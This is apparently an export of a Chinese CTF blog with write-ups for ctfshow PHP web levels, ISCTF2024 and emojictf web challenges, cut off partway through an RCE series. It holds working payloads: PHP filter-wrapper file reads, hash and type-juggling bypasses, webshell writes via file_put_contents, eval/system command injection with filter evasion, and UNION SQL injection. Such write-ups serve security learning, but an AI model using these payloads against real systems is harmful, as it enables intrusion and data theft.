class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>?cmd&#x3D;%0aphp(%0a是换行)</p><p>92：</p><p>和90一样；</p><p>93：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0)==4476)&#123;     echo $flag;</span><br></pre></td></tr></table></figure><p>过滤了字母但是就是不能使用16进制，但是可以使用8进制：num&#x3D;010574;</p><p>94:</p><p>多过滤了0,就是不能使用8进制，可以使用小数：num&#x3D;4476.0;</p><p>95:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;   $num = $_GET[&#x27;num&#x27;];   if($num==4476)&#123;     die(&quot;no no no!&quot;);   &#125;   if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;     die(&quot;no no no!!&quot;);   &#125;   if(!strpos($num, &quot;0&quot;))&#123;     die(&quot;no no no!!!&quot;);   &#125;   if(intval($num,0)===4476)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure><p><code>strpos()</code> 是 PHP 中的一个内置函数，用于查找字符串中第一次出现指定子字符串的位置。那么就可以使用：?num&#x3D;%0a010574(0b,0c)都是可以的;</p><p>96：</p><p>(1):直接上php伪协议：u&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>(2)linux:linux下面表示当前目录是 .&#x2F; 所以我们的payload： u&#x3D;.&#x2F;flag.php</p><p>97:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo $flag; else print &#x27;Wrong.&#x27;</span><br></pre></td></tr></table></figure><p>这个是md5绕过，在 PHP 中，存在弱类型比较的机制，即使用 <code>==</code> 进行比较时，PHP 会尝试将不同类型的数据转换为合适的类型再进行比较。当对数组使用 <code>md5()</code> 函数时，<code>md5()</code> 函数无法处理数组，会返回 <code>null</code>。</p><p>直接数组绕过：a[]&#x3D;1&amp;b[]&#x3D;2</p><p>98:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;); $_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;; $_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__); ?&gt; </span><br></pre></td></tr></table></figure><p>首先要看懂三元运算符，其格式为：(expr1) ? (expr2):(expr3)。如果 expr1 为 true，则执行 expr2；否则，执行 expr3。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure><p>即判断有没有GET的值传，如果有那么GET传参的值&#x3D;POST传参的值然后：?HTTP_FLAG&#x3D;flag&#x2F;&#x2F;POST:HTTP_FLAG&#x3D;flag</p><p>99:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow = array(); for ($i=36; $i &lt; 0x36d; $i++) &#123;   array_push($allow, rand(1,$i)); &#125; if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;   file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>首先创建一个名为$allow的数组；然后在这个数组里面使用for循环在数组中添加随机数从1一直到877：第一次:1-36,第二次:1-37依次循环；然后可以在当前目录新建一个文件并且在文件中写入任意的东西但是前提是传入n的值再随机数的数组中存在</p><p>这里说明一下：in_array函数的小问题：<strong>in_array(）此函数一般情况下会把 <code>&quot;1.php&quot;</code> 视为数字 <code>1</code>，2.php同理</strong></p><p>然后就猜1,2,3什么的概率大点：然后在：?n&#x3D;1.php;&#x2F;&#x2F;&#x2F;&#x2F;POST:content&#x3D;<?=system('ls');?>然后就是命令执行了</p><p>100：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\;/&quot;, $v2))&#123;     if(preg_match(&quot;/\;/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>这个首先要知道赋值操作大于and;即只要v1&#x3D;num就行了然后就可以利用eval函数了(RCE)就行了；</p><p>v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>101：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1=$_GET[&#x27;v1&#x27;]; $v2=$_GET[&#x27;v2&#x27;]; $v3=$_GET[&#x27;v3&#x27;]; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123;   if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;     if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;       eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);     &#125;   &#125;   &#125; </span><br></pre></td></tr></table></figure><p>这关和web100关的区别是禁用了许多符号这就说明我们无法使用注释来像上一关那样输出ctfshow;</p><p>这里呢需要使用内置函数反射类给他回显出来：</p><ul><li>ReflectionClass：获取类的相关信息，函数、属性、常量等；</li><li>ReflectionMethod：类的相关方法的获取以及调用；</li><li>ReflectionParameter：获取类的函数或者方法参数的相关信息；</li><li>ReflectionProperty：类的相关属性</li></ul><p>然后v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;</p><p>102：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; $v4 = is_numeric($v2) and is_numeric($v3); if($v4)&#123;   $s = substr($v2,2);   $str = call_user_func($v1,$s);   echo $str;   file_put_contents($v3,$str); &#125; else&#123;   die(&#x27;hacker&#x27;); &#125;  ?&gt; </span><br></pre></td></tr></table></figure><p>substr函数:substr(a,b):返回一部分，从b开始截取 例：$a&#x3D;123456 substr($a,2); 返回：3456</p><p>call_user_func ($callback, parameter)：调用函数，第一个参数为被调用的函数，第二个参数为被调用函数所需的参数</p><p>file_put_contents (filename, data)：把 data 数据写入 filename;</p><p>既然往进写文件那就可以写一个php的一句话木马或者是命令执行那一句话木马如何只作为数字并且经过函数又正常执行呢那一定是16进制和hex2bin但是0x在is_numeric里面过不去；所以可以进行：先base64再16进制：</p><?=`tac *`;(base64之后再转16进制)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=cc504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php` `post: v1=hex2bin</span><br></pre></td></tr></table></figure>103：就过滤了php,和102一样104：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2))&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>直接数组绕过105：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&#x27;flag.php&#x27;); error_reporting(0); $error=&#x27;你还想要flag嘛？&#x27;; $suces=&#x27;既然你想要那给你吧！&#x27;; foreach($_GET as $key =&gt; $value)&#123;   if($key===&#x27;error&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123;   if($value===&#x27;flag&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125; if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); &#125; echo &quot;your are good&quot;.$flag.&quot;\n&quot;; die($suces); ?&gt; </span><br></pre></td></tr></table></figure>变量覆盖：[PHP变量覆盖漏洞解析-CSDN博客](https://blog.csdn.net/weixin_43803070/article/details/91151861)foreach ($_GET as $key => $value)$$key = $$value这个的意思如果你进行GET传参的话：1=flag;那么就是$1=$flag;然后再根据条件:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); </span><br></pre></td></tr></table></figure>这个就是检查POST传参里面的键里面是不是有flag的参数；然后它比较 $_POST['flag'] 的值与之前加载的 flag.php 文件中定义的 $flag 变量的值是否相等。如果这两个值不相等（即 !($_POST['flag']==$flag) 为真），则执行die($error); 语句，终止脚本执行，并输出 $error 变量的值作为错误信息；这里利用的是die($error)来实现的输出pyload:GET:?1=flag  POST:error=1;即：$error=$1=$flag;106：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>数组绕过；107:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v3 = $_GET[&#x27;v3&#x27;];    parse_str($v1,$v2);    if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>`parse_str` 函数有两种使用方式：1. 当只传入一个参数时，它会把查询字符串解析成变量，并将这些变量注册到当前符号表中。//可以理解是传值2. 当传入两个参数时，它会把查询字符串解析成变量，然后将这些变量作为键值对存储在第二个参数所指定的数组里。先数组绕过?v3[]=1;然后<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>v1=flag108:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123;   die(&#x27;error&#x27;); &#125; //只有36d的人才能看到flag if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;   echo $flag; &#125; </span><br></pre></td></tr></table></figure>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配;?c=a%00778109:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;       eval(&quot;echo new $v1($v2());&quot;);   &#125; </span><br></pre></td></tr></table></figure>可以进行和反射类一样或者尝试一下异常类110：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;       die(&quot;error v1&quot;);   &#125;   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;       die(&quot;error v2&quot;);   &#125;   eval(&quot;echo new $v1($v2());&quot;); </span><br></pre></td></tr></table></figure>考点：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filesystemiterator 遍历文件类(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">DirectoryIterator 遍历目录类</span><br><span class="line"></span><br><span class="line">getcwd()函数 获取当前工作目录 返回当前工作目录</span><br></pre></td></tr></table></figure>然后遍历目录就行，查看到f开头的文件，直接访问就行了111：112：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>is_file函数是检查是不是存在这个文件，如果有echo hacker,否则就高亮显示；直接进行伪协议读取flag113:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($file)&#123;   if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;     die(&#x27;hacker!&#x27;);   &#125;else&#123;     return $file;   &#125; &#125; $file=$_GET[&#x27;file&#x27;]; if(! is_file($file))&#123;   highlight_file(filter($file)); &#125;else&#123;   echo &quot;hacker!&quot;; &#125;</span><br></pre></td></tr></table></figure>一看的话可能是伪协议；没有过滤封装协议；可以进行：?file=compress.zlib://flag.php114：`function filter($file){   if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){     die('hacker!');   }else{     return $file;   } } $file=$_GET['file']; echo "师傅们居然tql都是非预期 哼！"; if(! is_file($file)){   highlight_file(filter($file)); }else{   echo "hacker!"; } `师傅们居然tql都是非预期 哼！没有过滤filter;?file=php://filter/resource=flag.php;115:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($num)&#123;   $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);   return $num; &#125; $num=$_GET[&#x27;num&#x27;]; if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;   if($num==&#x27;36&#x27;)&#123;     echo $flag;   &#125;else&#123;     echo &quot;hacker!!&quot;;   &#125; &#125;else&#123;   echo &quot;hacker!!!&quot;;</span><br></pre></td></tr></table></figure>1:进行替换 2：是不是整数 3：不=36 4：trim函数去除俩边空白符，但是没有过滤\f   5:filter(num)=36<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 129; $i++) &#123;</span><br><span class="line">    $num = chr($i) . &#x27;36&#x27;;</span><br><span class="line">    if (trim($num) !== &#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num !== &#x27;36&#x27;) &#123;</span><br><span class="line">        echo urlencode(chr($i)) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>进行测试；?num=%0c36]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>isctf2024web</title>
      <link href="/2025/03/16/isctf2024web/"/>
      <url>/2025/03/16/isctf2024web/</url>
      
        <content type="html"><![CDATA[<h4 id="ISCTF2024："><a href="#ISCTF2024：" class="headerlink" title="ISCTF2024："></a>ISCTF2024：</h4><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php:"></a>1z_php:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;J&#x27;]))&#123;  $call=$_POST[&#x27;J&#x27;];  $dangerous_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;head&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;tail&#x27;, &#x27;vi&#x27;, &#x27;sed&#x27;, &#x27;od&#x27;];  foreach ($dangerous_commands as $command) &#123;    if (preg_match(&quot;/$command/i&quot;, $call)) &#123;      die(&quot;这些个危险函数可不兴使啊&quot;);    &#125;  &#125;  system($call);&#125;?&gt;</span><br></pre></td></tr></table></figure><p>J&#x3D;ls &#x2F;   J&#x3D;uniq &#x2F;f14g</p><h4 id="25时晓山瑞希生日会"><a href="#25时晓山瑞希生日会" class="headerlink" title="25时晓山瑞希生日会:"></a>25时晓山瑞希生日会:</h4><p>你不是烤p！要是Project Sekai的客户端请求才能加入生日会</p><p>在UA头上面改得到：你似乎没在正确的时间来…，额，时间:伪造data:Date: Thu, 27 Aug 2024 05:00:00 GMT</p><h4 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce:"></a>ezrce:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;   $cmd = $_GET[&#x27;cmd&#x27;];   if (preg_match(&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;, $cmd)) &#123;     die(&quot;Blocked by security filter!&quot;);   &#125; else &#123;     eval($cmd);   &#125; &#125; else &#123;   highlight_file(__FILE__); </span><br></pre></td></tr></table></figure><p>cmd&#x3D;var_dump(scandir(‘&#x2F;‘));进行读取根目录下面的文件发现flag，</p><p>法1：cmd&#x3D;include$_GET[1];&amp;1&#x3D;pHp:&#x2F;&#x2F;FilTer&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag 然后解码</p><p>法2：?cmd&#x3D;var_dump(file_get_contents($_GET[‘1’]));&amp;1&#x3D;&#x2F;flag</p><p>法3:取反绕过</p><p>法4:cmd&#x3D;passthru(‘cd%09..;cd%09..;uniq%09&#x2F;?l*’);</p><h4 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize:"></a>ezserialize:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php error_reporting(0); class Flag &#123;   private $flag;   public function __construct() &#123;     $this-&gt;flag = file_get_contents(&#x27;/flag&#x27;);   &#125;   public function getFlag() &#123;     return $this-&gt;flag;   &#125;   public function __toString() &#123;     return &quot;You can&#x27;t directly access the flag!&quot;;   &#125; &#125; class User &#123;   public $username;   public $isAdmin = false;   public function __construct($username) &#123;     $this-&gt;username = $username;   &#125;   public function __wakeup() &#123;     if ($this-&gt;isAdmin) &#123;       echo &quot;Welcome, admin! Here&#x27;s your flag: &quot; . (new Flag())-&gt;getFlag();     &#125; else &#123;       echo &quot;Hello, &quot; . htmlspecialchars($this-&gt;username) . &quot;!&quot;;     &#125;   &#125; &#125; if (isset($_GET[&#x27;data&#x27;])) &#123;   $data = $_GET[&#x27;data&#x27;];   $object = unserialize($data);   if ($object instanceof User) &#123;     echo $object;   &#125; else &#123;     echo &quot;Invalid object!&quot;;   &#125; &#125; else &#123;   highlight_file(__FILE__); &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>这个将false改为true然后随便传username就行了；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag &#123;</span><br><span class="line">    private $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $isAdmin = true;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User();</span><br><span class="line">$user-&gt;username =&quot;1&quot;;</span><br><span class="line">echo serialize($user);</span><br></pre></td></tr></table></figure><h4 id="小蓝鲨的临时存储室："><a href="#小蓝鲨的临时存储室：" class="headerlink" title="小蓝鲨的临时存储室："></a>小蓝鲨的临时存储室：</h4><p>这个直接传上去发现&#x2F;flag文件打不开权限不够</p><p>发现&#x2F;down_file.sh:find &#x2F;var&#x2F;www&#x2F;localhost&#x2F;htdocs&#x2F;uploads&#x2F; -type f -name “*.php” -exec rm -f {} ;</p><p>可以改为：&#x2F;flag &gt; &#x2F;tmp&#x2F;1.txt 然后等会就ok了</p><h4 id="小蓝鲨的冒险："><a href="#小蓝鲨的冒险：" class="headerlink" title="小蓝鲨的冒险："></a>小蓝鲨的冒险：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = &quot;isctf2024&quot;; $b = $_GET[&quot;b&quot;]; @parse_str($b); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123;   $num = $_POST[&quot;num&quot;];   if($num == 2024)&#123;     die(&quot;QAQ&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0) == 2024)&#123;     if (isset($_GET[&#x27;which&#x27;]))&#123;       $which = $_GET[&#x27;which&#x27;];       switch ($which)&#123;         case 0:           print(&#x27;QAQ&#x27;);         case 1:         case 2:           require_once $which.&#x27;.php&#x27;;           echo $flag;           break;         default:           echo GWF_HTML::error(&#x27;PHP-0817&#x27;, &#x27;Hacker NoNoNo!&#x27;, false);           break; </span><br></pre></td></tr></table></figure><p>首先是md5绕过：b&#x3D;a[0]&#x3D;240610708</p><p>然后:小数绕过：num&#x3D;2024.1或者8进制</p><p>然后：</p><p>if (isset($_GET[‘which’])){       $which &#x3D; $_GET[‘which’];       switch ($which){         case 0:           print(‘QAQ’);         case 1:         case 2:           require_once $which.’.php’;           echo $flag;           break;         default:           echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false);           break;</p><p>传which&#x3D;flag 正好匹配flag.php就出来了</p><h4 id="小蓝鲨的秘密："><a href="#小蓝鲨的秘密：" class="headerlink" title="小蓝鲨的秘密："></a>小蓝鲨的秘密：</h4><p>打开发现302跳转；直接抓包出来flag</p><h4 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader:"></a>UP!UPloader:</h4><p>文件上传，传上去小马；然后发现include.php会出来文件源码，先读upload.php</p><p>文件上传到 .&#x2F;uploads&#x2F; 目录下，文件名被重命名成 [md5 加密](<a href="https://so.csdn.net/so/search?q=md5">https://so.csdn.net/so/search?q=md5</a> 加密&amp;spm&#x3D;1001.2101.3001.7020)+后缀，按照逻辑访问</p><p>然后蚁剑连接就行了</p><p>发现找不到这里可以在网站上面执行:</p><p>cmd&#x3D;system(‘env’);</p><p>cmd&#x3D;phpinfo();都可以找到</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>emojictfweb</title>
      <link href="/2025/03/16/emojictfweb/"/>
      <url>/2025/03/16/emojictfweb/</url>
      
        <content type="html"><![CDATA[<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE:"></a>RCE:</h3><p>发现f12不能使用，没事，张师傅给我说ctrl+shift+i就可以了，ok.试了试发现没有有用的东西，dirsearch扫描一下发现robots.txt</p><p>然后发现 &#x2F;<a href="mailto:&#102;&#x6c;&#64;&#103;&#46;&#112;&#104;&#x70;">fl@g.php</a>,查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;emo&#x27;]))&#123;   $emo = $_GET[&#x27;emo&#x27;];  if(!preg_match(&quot;/\;|\&quot;|\*| |[b-h]|[m-r]|\\$|\&#123;|\&#125;|\^|\&gt;/i&quot;,$emo))&#123;    system($emo);  &#125;  else&#123;    echo &quot;Again&quot;;    &#125;&#125;else&#123;  echo &quot;Try&quot;;&#125;</span><br></pre></td></tr></table></figure><p>先进行ls查看，发现flag.txt，然后emo&#x3D;tail%09??a?.txt进行查看</p><h3 id="http"><a href="#http" class="headerlink" title="http:"></a>http:</h3><p>你的User-Agent必须被服务器识别为EMOJI_CTF_User_Agent_v1.0  只有使用正确的HTTP方法才能获取flag，不同的方法会得到不同的提示。 需要提供正确的自定义头部EMOJI-CTF-Auth且其值为’Passw0rd!’。 全部完成你就能获得flag!!!</p><p>在bp上面改然后在http方法上面进行爆破测试是什么方法，发现是PUT方法，然后访问fl1l1l1l1ag.php</p><h3 id="e4-sql"><a href="#e4-sql" class="headerlink" title="e4_sql:"></a>e4_sql:</h3><p>进行访问发现1”时候报错说明是字符形注入</p><p>1” order by 2#的时候和 3和4的时候不一样说明有俩列</p><p>-1” union select 1,2#发现2是回显位置</p><p>然后他没有过滤，直接注就行了</p><p>-1” union select 1,database()#<br>-1” union select 1,(select group_concat(username,password) from information)#</p><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web:"></a>easy_web:</h3><p>欢迎打开这个题目!</p><p>但是你的访问被拒绝了，因为我们采用了和知乎一样的反爬虫策略，而你的访问被认为是违规的爬虫了。</p><p>根据提示： User-Agent:Baiduspider</p><p>然后：欢迎来自垃圾百度的臭虫子！但是你爬不到什么了，因为本网站现在仅允许来自CloudFlare CDN的流量</p><p>那么CloudFlareCDN是什么，要特地提出来呢，不知道就去搜，Cloudflare HTTP 标头(<a href="https://developers.cloudflare.com/fundamentals/reference/http-headers/">Cloudflare HTTP 标头 ·Cloudflare 基础知识文档</a>)</p><p>然后就随便尝试了一下</p><p>CF-Connecting-IP:1<br>CF-IPCountry:1</p><p>发现好吧，你来自cloudflare CDN了，但是为了安全，后面的机密内容只能通过洋葱访问（我是怎么知道你是否来自洋葱的呢？这也是CF悄悄告诉我的呀）!</p><p>然后去查了查:</p><p>CF-Connecting-IP:1<br>CF-IPCountry:T1</p><p>OK完事了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SHOWRCE</title>
      <link href="/2025/03/05/SHOWRCE/"/>
      <url>/2025/03/05/SHOWRCE/</url>
      
        <content type="html"><![CDATA[<p>SHOWRCE</p><p>接下来开始我们的RCE刷题SHOW</p><p>29：</p><p>if(isset(<br>$_GET[‘c’]));if(!preg_match(“&#x2F;flag&#x2F;i”,$c)){eval($c);<br>}else{<br>highlight file( FILE );</p><p>先看代码分析出来这个是命令执行，让我们get传参c,然后过滤了flag和他的大小写</p><p>那么payload就出来了：c&#x3D;system(‘tac fl*.php’);(也可以使用其他的查看符)</p><p>其他：c&#x3D;system(‘tac fl””ag.php’);c&#x3D;system(‘tac fl&#96;&#96;ag.php’);c&#x3D;system(‘ta\c fl\ag.php’);等等</p><p>30：</p><p>if(isset($_GET[‘c’])){8c &#x3D; S GETL’c’]:if(!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c)){eval($c):<br>}else{<br>highlight_file( FILE);</p><p>和上面的差不多，就是过滤的多了</p><p>payload:</p><p>?c&#x3D;passthru(“tac fla*”);</p><p>?c&#x3D;echo<code>tac fla*</code>;</p><p>?c&#x3D;$a&#x3D;sys;$b&#x3D;tem;$c&#x3D;$a.$b;$c(“tac fla*”);</p><p>?c&#x3D;echo shell_exec(“tac fla*”);</p><p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac flag.php”);</p><p>echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;(show答案)</p><p>31：</p><p>多过滤了cat sort 这个怎么越来越多了，可以进行传参：c&#x3D;eval($_GET[a]);&amp;a&#x3D;system(‘cat flag.php’);也可以使用passthru(要注意过滤了空格)</p><p>32：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, 